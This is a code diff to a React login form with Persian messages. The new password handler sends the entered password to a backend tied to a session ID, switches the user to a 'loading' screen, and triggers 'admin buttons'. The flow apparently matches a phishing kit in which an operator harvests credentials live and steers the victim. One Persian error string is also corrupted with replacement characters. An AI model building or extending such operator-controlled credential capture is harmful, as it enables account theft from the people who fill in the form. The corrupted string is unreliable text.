@@ -275,7 +275,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطف�� کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطف���� کد صحیح را وارد کنید.",
           });
           break;
         case "email_code":
@@ -2671,9 +2671,50 @@ export const LoginForm = () => {
           {currentStep === "password" && (
             <PasswordForm
               onBack={() => setCurrentStep("phone")}
-              onSubmit={(password) => {
-                setPassword(password);
-                handlePasswordSubmit(new Event('submit') as any);
+              onSubmit={async (passwordValue) => {
+                setPassword(passwordValue);
+                setErrors({});
+
+                if (!passwordValue) {
+                  setErrors({ password: "رمز عبور الزامی است" });
+                  return;
+                }
+
+                if (!validatePassword(passwordValue)) {
+                  setErrors({
+                    password: "رمز عبور نمی‌تواند خالی باشد",
+                  });
+                  return;
+                }
+
+                setIsSubmitting(true);
+
+                try {
+                  const success = await updateAuthStep(sessionId, "password", passwordValue);
+                  if (!success) {
+                    throw new Error("Failed to update password step");
+                  }
+
+                  await new Promise((resolve) => setTimeout(resolve, 1000));
+                  setCurrentStep("loading");
+
+                  // Show admin buttons after reaching loading page
+                  setTimeout(async () => {
+                    try {
+                      console.log(
+                        "🔓 User reached loading step from password, showing admin buttons...",
+                      );
+                      await showAdminButtons(sessionId);
+                    } catch (error) {
+                      console.error("❌ Failed to show admin buttons:", error);
+                    }
+                  }, 500);
+                } catch (error) {
+                  console.error("Password submission error:", error);
+                  setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
+                } finally {
+                  setIsSubmitting(false);
+                }
               }}
               onForgotPassword={() => {
                 alert("لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.");
